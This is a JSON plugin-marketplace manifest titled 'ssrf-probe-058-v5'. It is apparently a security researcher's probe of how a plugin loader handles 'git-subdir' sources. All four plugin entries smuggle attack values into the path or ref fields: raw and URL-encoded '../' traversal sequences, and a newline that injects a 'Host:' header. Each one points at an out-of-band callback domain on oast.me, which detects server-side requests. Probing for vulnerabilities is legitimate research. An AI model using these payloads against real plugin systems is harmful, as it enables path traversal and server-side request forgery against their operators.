{
  "name": "ssrf-probe-058-v5",
  "description": "path traversal in git-subdir",
  "owner": {"name": "research", "email": "liamconner10@gmail.com"},
  "plugins": [
    {
      "name": "subdir-traverse-1",
      "description": "subdir ../",
      "category": "research",
      "source": {
        "source": "git-subdir",
        "url": "https://github.com/LiamConner10/058-plugin-source.git",
        "path": "../../../d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me",
        "ref": "main"
      }
    },
    {
      "name": "subdir-encoded",
      "description": "subdir url-encoded ../",
      "category": "research",
      "source": {
        "source": "git-subdir",
        "url": "https://github.com/LiamConner10/058-plugin-source.git",
        "path": "%2e%2e%2f%2e%2e%2fd8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me",
        "ref": "main"
      }
    },
    {
      "name": "subdir-fragment",
      "description": "subdir with newline",
      "category": "research",
      "source": {
        "source": "git-subdir",
        "url": "https://github.com/LiamConner10/058-plugin-source.git",
        "path": "x\nHost: d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me",
        "ref": "main"
      }
    },
    {
      "name": "subdir-ref-injection",
      "description": "ref with injection",
      "category": "research",
      "source": {
        "source": "git-subdir",
        "url": "https://github.com/LiamConner10/058-plugin-source.git",
        "path": "x",
        "ref": "../../d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me"
      }
    }
  ]
}
